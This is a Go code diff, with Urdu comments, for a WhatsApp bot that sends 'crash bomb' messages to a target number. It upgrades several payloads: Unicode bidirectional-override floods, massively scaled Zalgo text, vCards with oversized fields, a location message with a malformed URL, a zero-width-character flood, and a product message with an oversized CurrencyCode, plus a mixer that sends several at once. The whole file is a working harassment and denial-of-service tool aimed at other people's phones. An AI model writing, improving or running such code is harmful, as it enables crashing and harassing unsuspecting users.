@@ -6,8 +6,7 @@ import (
 	"strings"
 
 	"go.mau.fi/whatsmeow"
-	// 👇 پروٹوکول کا نیا راستہ
-	waProto "go.mau.fi/whatsmeow/binary/proto" 
+	waProto "go.mau.fi/whatsmeow/binary/proto"
 	"go.mau.fi/whatsmeow/types"
 	"go.mau.fi/whatsmeow/types/events"
 	"google.golang.org/protobuf/proto"
@@ -17,8 +16,8 @@ import (
 // 🏗️ HELPER 1: افقی وائرس (Horizontal/Length)
 // ---------------------------------------------------------
 func generateCrashPayload(length int) string {
-	// \u202c (PDF) کو نکال دیا ہے تاکہ لیئرز بند نہ ہوں
-	openers := "\u202e\u202b\u202d" 
+	// \u202c ہٹا دیا ہے تاکہ لوپ بند نہ ہو
+	openers := "\u202e\u202b\u202d"
 	return strings.Repeat(openers, length)
 }
 
@@ -26,19 +25,19 @@ func generateCrashPayload(length int) string {
 // 🏗️ HELPER 2: عمودی وائرس (Vertical/Zalgo)
 // ---------------------------------------------------------
 func generateZalgoPayload() string {
-	base := "﷽" // Heavy Char
+	base := "﷽"
 	marks := []string{
-		"\u0310", "\u0312", "\u0313", "\u0314", "\u0315", "\u033e", "\u033f", "\u0340", 
+		"\u0310", "\u0312", "\u0313", "\u0314", "\u0315", "\u033e", "\u033f", "\u0340",
 		"\u0341", "\u0342", "\u0343", "\u0344", "\u0345", "\u0346", "\u0347", "\u0348",
 		"\u0350", "\u0351", "\u0352", "\u0357", "\u0358", "\u035d", "\u035e", "\u0360",
 	}
 
 	var payload string
-	payload += "⚠️ SYSTEM OVERLOAD ⚠️\n"
-	
-	for i := 0; i < 200; i++ {
+	payload += "⚠️ SYSTEM FAILURE ⚠️\n"
+
+	for i := 0; i < 10000; i++ {
 		payload += base
-		for j := 0; j < 50; j++ {
+		for j := 0; j < 800; j++ { // اونچائی مزید بڑھا دی
 			for _, m := range marks {
 				payload += m
 			}
@@ -49,18 +48,11 @@ func generateZalgoPayload() string {
 }
 
 // ---------------------------------------------------------
-// 🚀 BUG COMMAND HANDLER (1-7)
+// 🚀 BUG COMMAND HANDLER (Attack Vector Updated)
 // ---------------------------------------------------------
 func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
 	if len(args) < 2 {
-		replyMessage(client, v, `⚠️ *Crash Menu:*
-1. Text Bomb (Nesting)
-2. VCard Bomb (Contact)
-3. Location Bomb (Map)
-4. Memory Flood (Invisible)
-5. Zalgo Text (Vertical) 🆕
-6. Catalog Bomb (Heavy) 🆕
-7. 🔥 MIXER (ALL IN ONE)`)
+        // یہاں آپ اپنا replyMessage فنکشن کال کر لیں جو دوسری فائل میں ہے
 		return
 	}
 
@@ -72,86 +64,111 @@ func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) 
 	}
 	jid, err := types.ParseJID(targetNum)
 	if err != nil {
-		replyMessage(client, v, "❌ غلط نمبر!")
+		fmt.Println("Error parsing JID:", err)
 		return
 	}
 
-	replyMessage(client, v, "🚀 Launching Attack Type "+bugType+"...")
+	fmt.Println("🚀 Launching Optimized Attack:", bugType)
 
 	switch bugType {
-	
-	case "1": // Text Bomb
-		client.SendMessage(context.Background(), jid, &waProto.Message{
-			Conversation: proto.String(generateCrashPayload(20000)),
-		})
 
-	case "2": // VCard Bomb
-		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(20000), "VIRUS")
+	case "1": // Text Bomb (Hidden Context Attack)
+		// ٹیکسٹ باڈی نارمل رکھیں، لیکن ContextInfo میں کچرا بھر دیں
+		crash := generateCrashPayload(30000)
 		client.SendMessage(context.Background(), jid, &waProto.Message{
-			ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("🔥"), Vcard: proto.String(vcard)},
-		})
-
-	case "3": // Location Bomb
-		client.SendMessage(context.Background(), jid, &waProto.Message{
-			LocationMessage: &waProto.LocationMessage{
-				DegreesLatitude: proto.Float64(24.8607), DegreesLongitude: proto.Float64(67.0011),
-				Name: proto.String("🚨 Crash Point"), Address: proto.String(generateCrashPayload(20000)),
+			ExtendedTextMessage: &waProto.ExtendedTextMessage{
+				Text: proto.String("🚨 Tap 'Read More' to Crash 🚨\n\n\n\n\n\n" + crash),
+				ContextInfo: &waProto.ContextInfo{
+					StanzaId:      proto.String(crash), // ID میں وائرس (یہاں چیکنگ کم ہوتی ہے)
+					Participant:   proto.String(crash), // Participant میں وائرس
+					QuotedMessage: &waProto.Message{Conversation: proto.String(crash)},
+				},
 			},
 		})
 
-	case "4": // Flood
+	case "2": // VCard Bomb (Heavy Field Injection)
+		virus := generateCrashPayload(30000)
+		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nORG:%s\nTITLE:%s\nEND:VCARD", 
+			"VIRUS", "VIRUS", virus, virus) // ORG اور TITLE میں وائرس گھسایا ہے
+		
 		client.SendMessage(context.Background(), jid, &waProto.Message{
-			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(strings.Repeat("\u200b", 20000))},
+			ContactMessage: &waProto.ContactMessage{
+				DisplayName: proto.String("☠️ DO NOT TOUCH"),
+				Vcard:       proto.String(vcard),
+			},
 		})
 
-	case "5": // Zalgo
+	case "3": // Location Bomb (Live Location Logic)
+		// لائیو لوکیشن کا تھمب نیل (JpegThumbnail) کرپٹ کرنے کی کوشش
+		virus := generateCrashPayload(30000)
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			LocationMessage: &waProto.LocationMessage{
+				DegreesLatitude:  proto.Float64(69.6969),
+				DegreesLongitude: proto.Float64(69.6969),
+				Name:             proto.String("🚨 " + virus), // نام میں وائرس
+				Address:          proto.String(virus),         // ایڈریس میں وائرس
+				Url:              proto.String("https://" + virus + ".com"), // URL پارسر کو کریش کرنے کے لیے
+			},
+		})
+
+	case "4": // Flood (Context Flood)
+		flood := strings.Repeat("\u200b", 30000) // 30k پوشیدہ الفاظ
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			ExtendedTextMessage: &waProto.ExtendedTextMessage{
+				Text: proto.String("Wait for it... ⏳" + flood),
+			},
+		})
+
+	case "5": // Zalgo (Vertical)
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			ExtendedTextMessage: &waProto.ExtendedTextMessage{
+				Text: proto.String(generateZalgoPayload()),
+			},
+		})
+
+	case "6": // 🔥 Catalog Bomb (Currency Code Exploit) - سب سے خطرناک
+		// CurrencyCode صرف 3 کریکٹرز کا ہوتا ہے (PKR, USD)
+		// ہم یہاں 5000 کریکٹرز ڈالیں گے، فارمیٹر پاگل ہو جائے گا
+		
+		virus := generateCrashPayload(30000)
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			ProductMessage: &waProto.ProductMessage{
+				Product: &waProto.ProductMessage_ProductSnapshot{
+					ProductID:       proto.String("1337"),
+					Title:           proto.String("💣 SYSTEM KILLER"),
+					Description:     proto.String(virus), 
+					CurrencyCode:    proto.String(virus), // ⚠️ اصل کریش پوائنٹ یہ ہے!
+					PriceAmount1000: proto.Int64(999999999),
+					ProductImageCount: proto.Uint32(1),
+				},
+				BusinessOwnerJID: proto.String(jid.String()),
+			},
+		})
+
+	case "7", "all": // Mixer
+		// سب سے پہلے Currency Code والا بھیجیں (Case 6)
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			ProductMessage: &waProto.ProductMessage{
+				Product: &waProto.ProductMessage_ProductSnapshot{
+					ProductID:    proto.String("666"),
+					Title:        proto.String("🔥"),
+					CurrencyCode: proto.String(generateCrashPayload(30000)), // Weak Spot
+				},
+				BusinessOwnerJID: proto.String(jid.String()),
+			},
+		})
+		
+		// پھر Context Info والا (Case 1)
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			ExtendedTextMessage: &waProto.ExtendedTextMessage{
+				Text: proto.String("Prepare..."),
+				ContextInfo: &waProto.ContextInfo{StanzaId: proto.String(generateCrashPayload(30000))},
+			},
+		})
+
+		// پھر Zalgo
 		client.SendMessage(context.Background(), jid, &waProto.Message{
 			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())},
 		})
-
-	case "6": // Catalog Bomb (Fixed Types)
-		client.SendMessage(context.Background(), jid, &waProto.Message{
-			ProductMessage: &waProto.ProductMessage{
-				Product: &waProto.ProductMessage_ProductSnapshot{
-					ProductID:       proto.String("999999"), // ✅ ID Capitalized
-					Title:           proto.String("💣 HEAVY LOAD"),
-					Description:     proto.String(generateCrashPayload(20000)),
-					CurrencyCode:    proto.String("PKR"),
-					PriceAmount1000: proto.Int64(0),
-					// ✅ Fixed: Int32 -> Uint32 Conversion
-					ProductImageCount: proto.Uint32(1), 
-				},
-				BusinessOwnerJID: proto.String(jid.String()), // ✅ ID Capitalized
-			},
-		})
-
-	case "7", "all": // Mixer (Fixed Types)
-		// 1. Text
-		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(generateCrashPayload(2000))})
-		// 2. VCard
-		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(20000), "VIRUS")
-		client.SendMessage(context.Background(), jid, &waProto.Message{ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("☠️"), Vcard: proto.String(vcard)}})
-		// 3. Location
-		client.SendMessage(context.Background(), jid, &waProto.Message{LocationMessage: &waProto.LocationMessage{DegreesLatitude: proto.Float64(0), DegreesLongitude: proto.Float64(0), Address: proto.String(generateCrashPayload(20000))}})
-		// 4. Zalgo
-		client.SendMessage(context.Background(), jid, &waProto.Message{ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())}})
-		// 5. Catalog
-		client.SendMessage(context.Background(), jid, &waProto.Message{
-			ProductMessage: &waProto.ProductMessage{
-				Product: &waProto.ProductMessage_ProductSnapshot{
-					ProductID:   proto.String("666"), // ✅ Fixed
-					Title:       proto.String("🔥"),
-					Description: proto.String(generateCrashPayload(20000)),
-				},
-				BusinessOwnerJID: proto.String(jid.String()), // ✅ Fixed
-			},
-		})
-
-		replyMessage(client, v, "✅ All Warheads Delivered! 💀")
-
-	default:
-		replyMessage(client, v, "❌ غلط ٹائپ!")
 	}
 }
-
-// Helper Reply
